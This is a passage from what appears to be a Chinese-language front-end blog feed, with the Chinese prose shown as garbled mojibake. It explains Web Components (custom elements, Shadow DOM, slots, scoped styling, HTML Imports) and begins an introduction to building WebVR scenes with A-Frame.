class FancyDrawer extends AppDrawer &#123;  constructor() &#123;    super(); // always call super() first in the ctor. This also calls the extended class&#x27; ctor.    ...  &#125;&#125;customElements.define(&#x27;fancy-app-drawer&#x27;, FancyDrawer);

æˆ–æ˜¯ç¹¼æ‰¿ Native Elementï¼š
// See https://html.spec.whatwg.org/multipage/indices.html#element-interfaces// for the list of other DOM interfaces.class FancyButton extends HTMLButtonElement &#123;  constructor() &#123;    super(); // always call super() first in the ctor.    this.addEventListener(&#x27;click&#x27;, e =&gt; this.drawRipple(e.offsetX, e.offsetY));  &#125;  // Material design ripple animation.  drawRipple(x, y) &#123;    let div = document.createElement(&#x27;div&#x27;);    div.classList.add(&#x27;ripple&#x27;);  &#125;&#125;customElements.define(&#x27;fancy-button&#x27;, FancyButton, &#123;extends: &#x27;button&#x27;&#125;);
é€™é‚Šè¦æ³¨æ„çš„æ˜¯ï¼Œå®šç¾©ç¹¼æ‰¿ Native element çš„å…ƒä»¶æ™‚ï¼Œéœ€è¦å‚³å…¥ç¬¬ä¸‰å€‹åƒæ•¸ {extendds: â€˜{native element you extend}â€™}è¡¨æ˜ä½ è¦ç¹¼æ‰¿çš„å…ƒç´ æ˜¯ä»€éº¼ï¼Œå› ç‚ºä¸åŒçš„ HTML tags å¯èƒ½å…±äº«ç›¸åŒçš„ DOM interfaceï¼Œåƒæ˜¯ &lt;q&gt; èˆ‡ &lt;blockquote&gt; éƒ½æ˜¯ HTMLQuoteElementã€‚
è€Œç¹¼æ‰¿ Native Element çš„ Custom-Element å¯ä»¥æœ‰å¦ä¸€ç¨®ç‰¹æ®Šä½¿ç”¨æ–¹å¼ï¼ˆä¸éæ”¯æ´åº¦æ›´ä½ XDï¼‰ï¼š
&lt;!-- This &lt;button&gt; is a fancy button. --&gt;&lt;button is=&quot;fancy-button&quot; disabled&gt;Fancy button!&lt;/button&gt;

Shadow DOMShadow DOM ç®—æ˜¯ Web Components ä¸­çš„éˆé­‚è§’è‰²ï¼Œä¸»è¦å°±æ˜¯è¨­è¨ˆä¾†å»ºæ§‹ Component-based çš„ web appï¼Œå®ƒæ‰€å¸¶ä¾†çš„å¥½è™•æœ‰ä¸‹åˆ—å¹¾é …ï¼š

Isolated DOMï¼šåœ¨ Shadow DOM è£¡é¢çš„ä»»ä½• nodes éƒ½ä¸æœƒè¢«å¤–é¢çš„ document.querySelector() çµ¦å–å¾—ï¼Œä¸æœƒè¢«æ±™æŸ“ä¹Ÿä¸æœƒå»æ±¡æŸ“åˆ¥äººã€‚

Scoped CSSï¼šå®šç¾©åœ¨ Shadow DOM å…§çš„ CSS å…¶ä½œç”¨åŸŸå°±åªåœ¨ Shadow DOM ç•¶ä¸­ï¼Œä¸æœƒä½œç”¨æ–¼ Shadow DOM å¤–çš„ elementsï¼Œè€Œå…¶ä»– Page çš„ style ä¹Ÿä¸æœƒå½±éŸ¿åˆ° Shadow DOM å…§çš„å®šç¾©ã€‚

Compositionï¼šå¯ä»¥é€é Shodow DOM è³¦äºˆä½ çš„ component æ“æœ‰ Declarative, markup-based çš„ API å¯æ“ä½œã€‚

Productivityï¼šæ—¢ç„¶æœ‰ Isolated DOM è·Ÿ Scoped CSSï¼Œå°±å¯ä»¥å°‡ä½ çš„ web app åˆ‡å‰²æˆå¤šå€‹ DOM object çµ„æˆï¼Œå®Œæˆæ¨¡çµ„åŒ–çš„ä½¿å‘½ï¼


åè©ä»‹ç´¹Shadow DOMï¼šè·Ÿä¸€èˆ¬çš„ DOM å·®ç•°åœ¨æ–¼å…¶ç”¢ç”Ÿçš„æ–¹å¼ï¼Œä»¥åŠä»–èˆ‡é é¢å…¶ä»–ç‰©ä»¶çš„äº’å‹•æ–¹å¼ã€‚
shadow treeï¼šä¸€èˆ¬ä¾†èªªä½ å¯ä»¥åˆ©ç”¨ document.createElement() ä¾†å‰µå»º DOMï¼Œä¸¦ appendChild() åˆ°å…¶ä»– element ä¸Šï¼Œè€Œ shadow dom å‰‡æ˜¯ä¾é™„åœ¨æŸå€‹ normal DOM åº•ä¸‹ï¼Œç”¢ç”Ÿä¸€å€‹ scoped subtreeï¼Œç¨±ä½œ shadow treeã€‚
shadow hostï¼šæ›è¼‰ shadow tree çš„å…ƒç´ å³ç‚ºè©² Shadow DOM çš„ shadow hostã€‚
Create Shadow DOMå…¶å¯¦ Shadow DOM ä¸ä¸€å®šè¦ç”¨åœ¨å»ºæ§‹ Web componentsï¼Œè¦å‰µå»º Shadow DOM åªè¦ç”¨ä¸‹åˆ—æ–¹å¼å³å¯ï¼š
const header = document.createElement(&#x27;header&#x27;);const shadowRoot = header.attachShadow(&#123;mode: &#x27;open&#x27;&#125;);shadowRoot.innerHTML = `      &lt;style&gt;#menu &#123; ... &#125;&lt;/style&gt; &lt;!-- styles are scoped to fancy-menu! --&gt;      &lt;div id=&quot;menu&quot;&gt;...&lt;/div&gt;    `; // Could also use appendChild().// header.shadowRoot === shadowRoot// shadowRoot.host === header
é€™æ¨£ä¸€ä¾†ï¼Œä½ å°±æœ‰ä¸€å€‹ header åº•ä¸‹çš„ Shadow DOM äº†ï¼Œè£¡é¢å®šç¾©çš„ #menu styleï¼Œä¸æœƒå‘å…§å¤–å½±éŸ¿ã€‚
ä½†ä¸¦éæ‰€æœ‰ DOM éƒ½å¯ä»¥æ›è¼‰ Shadow DOMï¼Œæœ‰äº›äº‹å·²ç¶“æœ‰è‡ªå·±çš„ Shadow DOM ï¼ˆåƒæ˜¯ &lt;textarea&gt;, &lt;input&gt;ï¼‰ï¼Œæœ‰äº›æ˜¯æ²’ä»€éº¼å¿…è¦ï¼ˆåƒæ˜¯ &lt;img&gt;ï¼‰ã€‚
Create Shadow DOM for Custom Elementåœ¨ Web Components ä¸­ï¼ŒShadow DOM éƒ½æœƒæ­é… Custom Element å‡ºç¾ï¼Œå¦‚æœèªª Custom Element æä¾› Web Component éª¨å¹¹ (HTML, DOM interface)ï¼ŒShadow DOM å°±æ˜¯æä¾›è¡€å’Œè‚‰ (JS, Scoped CSS)ã€‚
ä¸€æ¨£ä»¥æˆ‘å€‘å‰›å‰›çš„ç¯„ä¾‹ä¾†çœ‹ï¼Œåœ¨ Custom Element ä¸­å‰µå»º Shadow DOMï¼š
constructor() &#123;  super();  let shadowRoot = this.attachShadow(&#123;mode: &#x27;open&#x27;&#125;);  const t = document.querySelector(&#x27;#gakki-div-template&#x27;);  const instance = t.content.cloneNode(true);  shadowRoot.appendChild(instance);    this.shadowDOM = shadowRoot;  // Setup a click listener on &lt;gakki-div-template&gt; itself.  this.addEventListener(&#x27;click&#x27;, e =&gt; &#123;    this.addImg();  &#125;);&#125;

é€™é‚Šæœ‰å¹¾é»è¦èªªæ˜ï¼š

åˆ©ç”¨ this.attachShadow(&#123;mode: &#39;open&#39;&#125;) ä¾†ç¶å®š Shadow DOM åˆ°ç›®å‰çš„ Custom Elementï¼Œå…¶ä¸­çš„ &#123;mode: &#39;open&#39;&#125; æ˜¯ä»£è¡¨é€™æ˜¯å€‹ open mode çš„ Shadow DOMï¼Œhost é€™å€‹ Shadow DOM çš„ Element (ä»¥é€™é‚Šçš„ä¾‹å­å°±æ˜¯æˆ‘å€‘çš„ Custom Elementï¼‰å¯ä»¥é€é JS å–å¾— Shadow DOM å…§éƒ¨çš„ DOM å…ƒä»¶ï¼Œåä¹‹ï¼Œå¦‚æœè¨­ç½®ç‚º closeï¼Œå³ç„¡æ³•å–å¾—ï¼Œå®˜æ–¹ä¸å»ºè­°æˆ‘å€‘è¨­å®šç‚º closeï¼Œè©³æƒ…å¯ä»¥åƒè€ƒ é€™è£¡

é€é const t = document.querySelector(&#39;#gakki-div-template&#39;); æˆ‘å€‘å–å‡º templateï¼Œä¸¦åˆ©ç”¨ t.content.cloneNode() è¤‡è£½ä¸€ä»½ templateï¼Œæ¥è‘—å°‡æ­¤ template appendChild åˆ°æˆ‘å€‘çš„ shadow tree ä¸­ã€‚


é€éé€™æ¨£çš„æ–¹å¼ï¼Œæˆ‘å€‘å°±æ“æœ‰ä¸€å€‹æ“æœ‰ Scoped template çš„ Custom Elementï¼Œå› ç‚ºæ•´å€‹ Element çš„å…§å®¹éƒ½æ˜¯é€é template èˆ‡ Shadow DOM ç”¢ç”Ÿçš„ï¼Œåˆ¥äººå¯ä»¥è‡ªç”±æ‹¿å»ä½¿ç”¨ï¼Œä¹Ÿä¸ç”¨æ“”å¿ƒä»–å€‘æœƒæ±¡æŸ“åˆ°é€™å€‹å…ƒä»¶ï¼
Slot elementåœ¨æˆ‘å€‘ç¯„ä¾‹çš„ template ä¸­æœ‰å€‹å¥‡å¦™çš„å…ƒç´  slot
&lt;template id=&quot;gakki-div-template&quot;&gt;  &lt;style&gt;    ...  &lt;/style&gt;  &lt;p&gt;Gakki Meme&lt;/p&gt;  &lt;div class=&quot;wrapper&quot;&gt;    &lt;img width=&quot;300px&quot; src=&quot;http://static.ettoday.net/images/2083/d2083850.jpg&quot; /&gt;    &lt;div class=&quot;slot&quot;&gt;      &lt;slot&gt;&lt;/slot&gt;    &lt;div&gt;  &lt;/div&gt;&lt;/template&gt;

å®ƒçš„ç”¨é€”å¾ˆç°¡å–®ï¼Œå°±æ˜¯ä¸€å€‹ placeholdersï¼Œè®“å…ƒä»¶çš„ consumer å¯ä»¥å®‰æ’è‡ªå·±çš„ DOM é€²å»ï¼Œè€Œä½ é€é slot çš„ä½ç½®ä¾†æ±ºå®šé€™äº› user çš„ DOM è©²æ”¾åœ¨å“ªäº›ä½ç½®ã€‚
åœ¨ç¯„ä¾‹ä¸­ï¼š
&lt;gakki-div-template light&gt;ä½ å¥½ï¼Œæˆ‘æ˜¯æ£®å±±&lt;/gakki-div-template&gt;

æˆ‘å€‘å°‡æ–‡å­— â€˜ä½ å¥½ï¼Œæˆ‘æ˜¯æ£®å±±â€™ï¼Œæ”¾å…¥ custom elementï¼Œä»–å°±æœƒè¢«æˆ‘å€‘å®‰æ’åˆ° &lt;slot&gt;&lt;/slot&gt; çš„ä½ç½®
å¦‚æœæœ‰å…©å€‹ä»¥ä¸Šçš„å…ƒç´ è¦æ’å…¥çš„è©±ï¼Œå°±éœ€è¦ç”¨ name ä¾†ç¶å®šï¼š
&lt;gakki-div-template light&gt;  &lt;span slot=&quot;title&quot;&gt;ä½ å¥½ï¼Œæˆ‘æ˜¯æ£®å±±&lt;/span&gt;  &lt;div&gt;å—¨..å¦³å¥½&gt;//&lt; &lt;/div&gt;&lt;/gakki-div-template&gt;

&lt;template&gt;    ...    &lt;p&gt;Gakki Meme&lt;/p&gt;    &lt;div class=&quot;wrapper&quot;&gt;        &lt;img width=&quot;300px&quot; src=&quot;http://static.ettoday.net/images/2083/d2083850.jpg&quot; /&gt;        &lt;div class=&quot;slot&quot;&gt;            &lt;slot name=&quot;title&quot;&gt;&lt;/slot&gt;        &lt;/div&gt;        &lt;div class=&quot;slot2&quot;&gt;             &lt;slot&gt;&lt;/slot&gt;        &lt;/div&gt;    &lt;/div&gt;  ...&lt;/template&gt;
JS Bin on jsbin.com
ä½ å€‘ä¹Ÿå¯ä»¥æ‰“é–‹ DevTool ä¾†çœ‹ä¸€ä¸‹ Shadow DOM çš„å…ƒä»¶å±•é–‹æœƒæ˜¯é•·ä»€éº¼æ¨£å­ï¼Œé€™é‚Šå°±ä¸å†è´…è¿°ã€‚
Shadow DOM Stylingæ¥ä¸‹ä¾†ä»‹ç´¹å¦‚ä½•åœ¨ Shadow DOM ä¸­è¨­å®š CSSã€‚
åœ¨ Shadow DOM ä¸­çš„ CSS å…¶å¯¦è·Ÿä¸€èˆ¬ä½¿ç”¨ä¸Šæ²’æœ‰å¤ªå¤§å·®ç•°ï¼Œä½ æ‰€è¨­å®šçš„ CSS selector éƒ½æ˜¯ local çš„ï¼Œä¹Ÿå°±æ˜¯åªèƒ½è¨­å®šåˆ° Shadow DOM è£¡é ­çš„ elementï¼Œä¸æœƒå—å¤–éƒ¨å½±éŸ¿ï¼Œä¹Ÿä¸æœƒå½±éŸ¿åˆ°å¤–éƒ¨ã€‚
æ¯”è¼ƒéœ€è¦èªªæ˜çš„æœ‰ä¸‰å€‹éƒ¨åˆ†ï¼š

:hostï¼š

ä½ å¯ä»¥ç”¨ :host é€™å€‹ selector ä¾†è¨­å®šä½ çš„ component çš„ styleï¼Œä½†è¦æ³¨æ„çš„æ˜¯ï¼Œ:host æ‰€è¨­å®šçš„å€¼ï¼Œæ˜¯å¯ä»¥è¢«å¤–éƒ¨ component çš„ä½¿ç”¨è€…è“‹éå»çš„ã€‚
åƒç¯„ä¾‹ä¸­ç‚ºäº†è®“ slot çš„å­—èƒ½çµ•å°å®šä½ï¼Œæˆ‘éœ€è¦æŠŠ &lt;gakki-div-template&gt; æœ¬èº«è¨­å®šç‚º relative
:host &#123;      position: relative;      display: block;      width: 300px;    &#125;


:host-contextï¼šè®“ä½ æ ¹æ“š Component çš„ Context ä¾†è¨­å®š styleï¼Œåƒæ˜¯ï¼š

ç•¶è™•æ–¼ darktheme class ä¸‹æ™‚ï¼Œé¡è‰²è¦è®Šæˆç™½è‰²ã€‚
&lt;body class=&quot;darktheme&quot;&gt;  &lt;fancy-tabs&gt;    ...  &lt;/fancy-tabs&gt;&lt;/body&gt;&lt;style&gt;    :host-context(.darktheme) &#123;      color: white;      background: black;    &#125;&lt;/style&gt;


::slottedï¼šæœ€å¾Œå‰‡æ˜¯é€é ::slottedï¼Œä¾†æ§åˆ¶å‚³å…¥çš„ slot å…ƒä»¶çš„ styleã€‚

åƒç¯„ä¾‹ä¸­ï¼š
&lt;template&gt;    &lt;style&gt;        ...        ::slotted(#me)&#123;          color: blue;        &#125;        ...    &lt;/style&gt;    ...&lt;/template&gt;...&lt;gakki-div-template light&gt;  &lt;span slot=&quot;title&quot;&gt;ä½ å¥½ï¼Œæˆ‘æ˜¯æ£®å±±&lt;/span&gt;  &lt;div id=&quot;me&quot;&gt;å—¨..å¦³å¥½&gt;//&lt;&lt;/div&gt;&lt;/gakki-div-template&gt;

Event Handle in Shadow DOMShadow DOM é‚„æœ‰è¨±å¤š Event è™•ç†ï¼ŒåŒ…å« Slot çš„ event è™•ç†ç­‰ç­‰ issue å¯ä»¥æ¢è¨ï¼Œé€™é‚Šåªç°¡å–®è¬›å€‹ä¸»è¦è§€å¿µã€‚
åœ¨ Shadow DOM ä¸­å°æ–¼äº‹ä»¶è™•ç†ï¼Œæ˜¯é€éåœ¨ Event Bubble çš„éç¨‹ä¸­ï¼Œä¾†é‡æ–°å®šä½ event target çš„ä½ç½®ï¼Œè®“è©²äº‹ä»¶åƒæ˜¯å¾ Host çš„å…ƒä»¶è§¸ç™¼ï¼Œä¸¦ä¸”æœƒæ“‹æ‰å¯èƒ½å½±éŸ¿åˆ°å¤–éƒ¨é é¢çš„äº‹ä»¶è™•ç†ã€‚
è©³ç´°å¯ä»¥çœ‹ é€™é‚Š èˆ‡ é€™é‚Š
HTML ImportWeb Component çš„æœ€å¾Œä¸€å“©è·¯ï¼Œç•¶æˆ‘å€‘è£½ä½œå¥½æˆ‘å€‘çš„ Component å¾Œï¼Œç•¶ç„¶æœƒå¸Œæœ›èƒ½å¾ˆæ–¹ä¾¿åœ°çµ¦ä»–äººä½¿ç”¨ï¼ŒHTML Import å°±æ˜¯è¦è™•ç†é€™æ¨£çš„å•é¡Œã€‚
ä»–è®“æˆ‘å€‘å¯ä»¥ç›´æ¥ link ä¸€ä»½ HTML æª”æ¡ˆï¼Œä¸ç®¡ä»–æ˜¯ template ä¹Ÿå¥½ï¼Œç”¨ shadow dom å‰µå»ºçš„ custom-element ä¹Ÿå¥½ï¼Œéƒ½å¯ä»¥ç›´æ¥ inlcudeã€‚
ä½¿ç”¨æ–¹æ³•å¾ˆç°¡å–®ï¼Œå‡è¨­æˆ‘å€‘ç¯„ä¾‹ä¸­çš„ HTML å«åš GakkiMeme.htmlï¼Œåˆ¥äººæƒ³è¦ include çš„è©±ï¼Œåªè¦åœ¨ä»–çš„ index.html ä¸­åŠ å…¥ &lt;link rel=&quot;import&quot; href=&quot;GakkiMeme.html&quot;&gt; å³å¯ä½¿ç”¨ï¼š
index.html&lt;head&gt;  &lt;link rel=&quot;import&quot; href=&quot;GakkiMeme.html&quot;&gt;&lt;/head&gt;&lt;body&gt;  &lt;gakki-div-template&gt;    &lt;span slot=&#x27;title&#x27;&gt; å—¨å—¨å—¨ &lt;/span&gt;    &lt;div id=&quot;me&quot;&gt; å˜¿å˜¿å˜¿ &lt;/div&gt;  &lt;/gakki-div-template&gt;&lt;/body&gt;
ç•¶ç„¶ Import çš„éƒ¨åˆ†é‚„æœ‰å¾ˆå¤šå¯ä»¥ç©ï¼Œæœ‰èˆˆè¶£çš„å¯ä»¥åˆ° HTML5rocks ç ”ç©¶ã€‚
ConclusionWeb Components æä¾›æˆ‘å€‘ä¸€ç¨®æ–¹å¼ä¾†å»ºæ§‹ reusable componentsï¼Œèƒ½æ”¯æ´ Cross-browser (ç•¶ç„¶è¦ç­‰æ¨™æº–å…¨é€šéï¼Œç€è¦½å™¨å…¨æ”¯æ´ï¼Œä½†ç›¸ä¿¡é‚£å¤©æœƒåˆ°ä¾†çš„ï¼)ï¼›ä¸éœ€è¦ä»»ä½• framework æ”¯æ´ï¼›ä¹Ÿä¸éœ€è¦å­¸ç‰¹æ®Šèªæ³•ï¼Œå°±æ˜¯ DOM&#x2F;CSS&#x2F;HTML&#x2F;JSï¼›å¯ä»¥è·Ÿç¾æœ‰ Framework å…±å­˜ä½¿ç”¨ã€‚
ç›¸ä¿¡åœ¨æœªä¾†æˆ‘å€‘æœƒæœ‰æ›´ç¾å¥½çš„ Web å¯ä»¥ä½¿ç”¨ï¼
æœ€å¾Œé™„ä¸Š Browser Support çš„ Information çµ¦å„ä½ï¼š
custom-elementv1shadow-dom
è³‡æ–™ä¾†æº
W3C Web Components
Custom Elements v1
Shadow DOM v1
Web Componentsæ•´ç†åŠåˆ†äº«
Web Components åˆæ¢
basic-web-components
HTML Imports

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>web, web components, shadow dom, custom element</tag>
      </tags>
  </entry>
  <entry>
    <title>Web VR åˆæ¢</title>
    <url>/2017/04/01/web-vr-101/</url>
    <content><![CDATA[Web VR å‡ºä¾†ä¹Ÿå¾ˆä¹…äº†ï¼Œä½†æ²’æœ‰å»ç©éï¼Œå› ç‚ºæƒ³èªªæˆ‘æ²’æœ‰ç›¸é—œè¨­å‚™ï¼Œç›´åˆ°å‰é™£å­çœ‹åˆ°é€™ç¯‡æ–‡ç«  Minecraft in WebVR with HTML Using A-Frame
æ•´å€‹é©šè‰·ï¼
éš¨ä¾¿åŠ å¹¾å€‹ tagï¼Œç„¶å¾Œèª¿æ•´ä¸€ä¸‹å°±å¯ä»¥æœ‰ VR æ•ˆæœï¼Œé€™æ±è¥¿ä¸è©¦è©¦æ€éº¼è¡Œï¼èªªä¸å®šä»¥å¾Œèƒ½åƒé€™ç¯‡ä½œè€…ä¸€æ¨£ï¼Œåœ¨è‡ªå·±çš„å©šç¦®ä¸Šæä¸€å¥— VR çš„ç¶²ç«™ï¼å› æ­¤æ±ºå®šè·Ÿè‘—å®˜ç¶²ç¯„ä¾‹ä¾†äº†è§£ä¸€ä¸‹ Web VR åˆ°åº•è©²å¦‚ä½•å¯¦ä½œã€‚
ä¸€æ¨£å…ˆçœ‹å€‹æˆå“ï¼š
See the Pen webVR-test-demo5 by Arvin (@arvin0731) on CodePen.


A-frameA-Frame æ˜¯ Mozilla VR team ç‚ºäº†åœ¨ browser ä¸Šåˆ©ç”¨ Javascript æä¾› VR é«”é©—çš„ä¸€å¥— web frameworkï¼Œå®˜ç¶² ä¸Šæœ‰å¾ˆè©³ç´°çš„æ•™å­¸èˆ‡ä»‹ç´¹ã€‚æ ¸å¿ƒåŸºæ–¼ HTML èˆ‡ entity-component-system framework (ä¼¼ä¹æ˜¯ä¸€å¥—éŠæˆ²ä¸Šå¸¸ç”¨çš„ patternï¼Œåƒæ˜¯ Unity)ï¼Œé›–ç„¶æˆ‘ä¸æ‡‚éŠæˆ²ï¼Œä½†ä»–çš„æ¦‚å¿µé —ç°¡å–®ï¼Œ**â€ECS favors composition over inheritanceâ€**ã€‚
åœ¨æ¯å€‹å ´æ™¯ï¼ˆsceneï¼‰ä¸­çš„æ¯å€‹ç‰©ä»¶ï¼ˆobjectï¼‰éƒ½æ˜¯ä¸€å€‹ entityï¼Œentity å¯ä»¥æƒ³åšä¸€å€‹ç‰©ä»¶çš„ç©ºæ®¼ï¼Œè€Œè©²ç©ºæ®¼çš„å‹•ä½œã€è¡Œç‚ºã€å¤–è§€çš†æ˜¯ç”± components ä¾†å®Œæˆã€‚æ‰€ä»¥é€éåœ¨å ´æ™¯ä¸­æ··æ­çµ„åˆå„ç¨® components å°±èƒ½å‰µé€ å‡ºç„¡æ•¸ç¨®çš„ç‰©ä»¶ï¼Œé€™ç¨®æ–¹å¼è‹¥æ˜¯ç”¨ç¹¼æ‰¿çš„æ–¹å¼å‰‡æœƒéœ€è¦ create è¨±å¤šç‰¹æ®Šçš„ class æ‰è¡Œã€‚
åœ¨ A-frame ä¸­ï¼Œä¸€å€‹ entity å°±æ˜¯ &lt;a-entity&gt;&lt;/a-entity&gt;ã€‚
è€Œé€™å€‹ entity å¯ä»¥æ›è¼‰ä¸Šå„ç¨® componentï¼Œå¤§è‡´çš„æ–¹å¼å¦‚ä¸‹ï¼š
AFRAME.registerComponent(&#x27;sun&#x27;, &#123;  schema: &#123;    degree: &#123;type: &#x27;number&#x27;&#125;,    color: &#123;type: &#x27;string&#x27;&#125;  &#125;,  init: function () &#123;    // Do something when component is plugged in.  &#125;,  update: function () &#123;    // Do something when component&#x27;s data is updated.  &#125;&#125;);

æ¥è‘—å°±èƒ½å¤ åœ¨ html ä¸­ä½¿ç”¨ sun é€™å€‹ componentï¼Œ&lt;a-entity sun=&quot;degree: 5; color: yellow&quot;&gt;&lt;/a-entity&gt;ã€‚ï¼ˆé€™é‚Šæ¯”è¼ƒæœƒè·Ÿä¸€èˆ¬çš„ html tag æ··æ·†ï¼Œå› ç‚º tag ä¸Šçœ‹ä¼¼ attribute çš„æ±è¥¿å…¶å¯¦æ˜¯ entity æ›è¼‰çš„ componentã€‚ï¼‰
å°±åƒ Web component ä¸€æ¨£ï¼ŒA-frame ä¹Ÿæœ‰å€‹ A-Frame Registry åœ¨æ”¶é›†å„ç¨®é–‹ç™¼è€…è²¢ç»çš„ componentã€‚
é™¤äº† &lt;a-entity&gt;&lt;/a-entity&gt; ä»¥å¤–ï¼ŒWeb VR é‚„æœ‰è¨±å¤šåŸç”ŸåŸä»¶ï¼Œåƒæ˜¯ &lt;a-scene&gt;ã€&lt;a-assets&gt;ã€&lt;a-box&gt; ç­‰ç­‰ã€‚é€™äº› Primitives çš„ tag ä¹Ÿæ˜¯ä¸€ç¨® entityï¼Œä¸»è¦æ˜¯åŒ…å«äº†ä¸€äº›è¤‡é›œä½†æ˜¯ common çš„å…ƒä»¶ï¼ˆåƒæ˜¯ ï¼Œç”¨ä¾†ä»£è¡¨å ´æ™¯ä¸­çš„å¤©ç©ºï¼‰ï¼Œä»¥ &lt;a-box&gt; ç‚ºä¾‹ï¼Œå…¶å¯¦å°±æ˜¯ä¸€å€‹åŒ…å« geometry èˆ‡ material components çš„ entityï¼š
&lt;a-entity id=&quot;box&quot; geometry=&quot;primitive: box&quot; material=&quot;color: red&quot;&gt;&lt;/a-entity&gt;

ä¹Ÿå¯ä»¥é€é AFRAME.registerPrimitive çš„æ–¹å¼ä¾†è¨»å†Šï¼š
AFRAME.registerPrimitive(&#x27;a-wave&#x27;, &#123;  // Attaches the wave component by default.  // And smartly makes the wave parallel to the ground.  defaultComponents: &#123;    wave: &#123;&#125;,    rotation: &#123;x: -90, y: 0, z: 0&#125;  &#125;,  // Maps HTML attributes to wave component&#x27;s properties.  mappings: &#123;    width: &#x27;wave.width&#x27;,    depth: &#x27;wave.depth&#x27;,    density: &#x27;wave.density&#x27;,    color: &#x27;wave.color&#x27;,    opacity: &#x27;wave.opacity&#x27;  &#125;&#125;);

é€™æ¨£å°±æœ‰ä¸€å€‹ Primitives å…ƒä»¶å¯ç”¨ï¼Œ&lt;a-wave color=&quot;aqua&quot; depth=&quot;100&quot; width=&quot;100&quot;&gt;&lt;/a-wave&gt;
å…¶ä¸­å¯ä»¥çœ‹åˆ°æˆ‘å€‘æœ‰ defaultComponents èˆ‡ mappings å…©å€‹ properties å¯ä»¥ç”¨ï¼Œåˆ†åˆ¥è®“ä½ è¨­ç½®é€™å€‹ entity çš„ default component èˆ‡ å°‡ HTML çš„ attribute æ˜ å°„åˆ°ä½ è‡ªå®šç¾©çš„ component çš„å±¬æ€§ä¸­ï¼Œå‘é€™é‚Šå°±æ˜¯å°‡ html çš„ width æ˜ å°„åˆ° wave é€™å€‹ component çš„ width å±¬æ€§ã€‚
æ›´è©³ç´°å…§å®¹å¯ä»¥åƒè€ƒå®˜ç¶² primitives
Our first Web VR Scene (Skeleton)æ¥ä¸‹ä¾†å¾å¯¦ä½œä¸€å€‹æœ€ç°¡å–®çš„ Web VR Scene ä¾†ä¸€æ­¥æ­¥èªè­˜ Web VR çš„ä¸€äº›åŸºç¤å…ƒä»¶ã€‚
Web VR çš„åŸºç¤éª¨å¹¹ï¼š
&lt;html&gt;  &lt;head&gt;    &lt;script src=&quot;https://aframe.io/releases/0.5.0/aframe.min.js&quot;&gt;&lt;/script&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;a-scene&gt;    &lt;/a-scene&gt;  &lt;body&gt;&lt;/html&gt;

&lt;a-scene&gt; æœƒ setup ä¸€åˆ‡ VR æ‰€éœ€çš„æ±è¥¿ï¼Œä¸¦åŒ…å«æ‰€æœ‰ entitiesï¼ŒåŒ…å« WebGL, canvas, camera ç­‰ç­‰ï¼Œå¦å¤–é‚„æœ‰ä¸€äº›é‡å°ä¸åŒå¹³å°çš„ WebVR supportï¼Œä¸€å€‹ out of box çš„ magic tagï¼åŠ ä¸Šé€™å€‹ä»¥å¾Œï¼Œæ•´å€‹ html å°±æœƒè®Šæˆ WebVR çš„éª¨å¹¹äº†ï¼Œä½ åœ¨ codepen ä¸Šçš„è©±å°±æœƒçœ‹åˆ°å³ä¸‹è§’æœ‰å€‹çœ¼é¡çš„åœ–ç¤ºã€‚ï¼ˆç•¶ç„¶è¨˜å¾—è¦è¼‰å…¥ aframe.jsï¼‰
æ¥è‘—ï¼Œæˆ‘å€‘éœ€è¦ç­è§£ä¸€ä¸‹åœ¨ A-frame çš„ä¸–ç•Œä¸­çš„åº§æ¨™ç³»çµ±ï¼Œæ¡ç”¨æ‰€è¬‚çš„ right-hand rule

åœ¨ WebVR API å›å‚³çš„è·é›¢è³‡æ–™ä»¥ Meter ç‚ºå–®ä½ï¼Œå› æ­¤åœ¨ A-frame ä¸­çš„è·é›¢å–®ä½ä¹Ÿæ˜¯ Meterï¼Œæ‰€ä»¥ç•¶ä½ åœ¨è¨­è¨ˆä½ çš„ WebVR project æ™‚è¦æ³¨æ„ä¸€ä¸‹ï¼Œheight: 10 è·Ÿ width: 10 åœ¨ä¸€èˆ¬é–‹ç™¼ web ä¾†èªªå¥½åƒå¾ˆå°ï¼Œä½†åœ¨ A-frame ä¸­å¯æ˜¯æœƒè¶…å¤§ã€‚
Add Entityå†ä¾†æˆ‘å€‘å¯ä»¥åœ¨ &lt;a-scene&gt; ä¸­åŠ å…¥ &lt;a-cylinder color=&quot;red&quot;&gt;&lt;/a-cylinder&gt;
&lt;a-scene&gt;    &lt;a-cylinder color=&quot;red&quot;&gt;&lt;/a-cylinder&gt;&lt;/a-scene&gt;

ç•¶ä½ æ”¾ä¸Šå»ä»¥å¾Œæ‡‰è©²æœƒè¦ºå¾—å¥‡æ€ªï¼Œæ€éº¼ä»€éº¼éƒ½çœ‹ä¸åˆ°ï¼Œè½‰å‹•äº†ä¸€ä¸‹æ‰ç™¼ç¾æ±è¥¿åœ¨ä½ è…³ä¸‹ï¼¸ï¼¤åŸå› å¾ˆç°¡å–®ï¼Œæˆ‘å€‘æ²’æœ‰è¨­å®š postionï¼Œæ‰€ä»¥ x, y, z è»¸éƒ½æ˜¯ 0ã€‚æ ¹æ“š right-hand ruleï¼Œæˆ‘å€‘å¯ä»¥çµ¦ position component ä¸€äº›åƒæ•¸ï¼Œå¦å¤–é‚„å¯ä»¥é€²è¡Œ rotation èˆ‡ scaleï¼š
&lt;a-scene&gt;    &lt;a-cylinder color=&quot;red&quot; position=&quot;0 2 -5&quot; rotation=&quot;30 45 45&quot; scale=&quot;1 1 1&quot;&gt;&lt;/a-cylinder&gt;&lt;/a-scene&gt;

å¦‚æ­¤æ‡‰è©²å°±èƒ½çœ‹åˆ°å¦‚ä¸‹çµæœï¼š
See the Pen webVR-test-demo1 by Arvin (@arvin0731) on CodePen.


Noteï¼šé€™é‚Šå²”é–‹ä»‹ç´¹ä¸€ä¸‹ codepen ä¸Šçš„ WebVR åŠŸèƒ½ï¼Œé»é¸å³ä¸‹è§’çœ¼é¡å¯ä»¥é€²å…¥å…¨ VR ç’°å¢ƒï¼Œåœ¨é›»è…¦ä¸Š default çš„æ§åˆ¶æ˜¯ç”¨æ»‘é¼ æ‹–æ‹‰ï¼Œæˆ–æ˜¯ WASD æ§åˆ¶ï¼Œå¦‚æœä½ æœ‰ VR headset å°±èƒ½æ›´ç›´æ¥çš„é«”é©—ã€‚
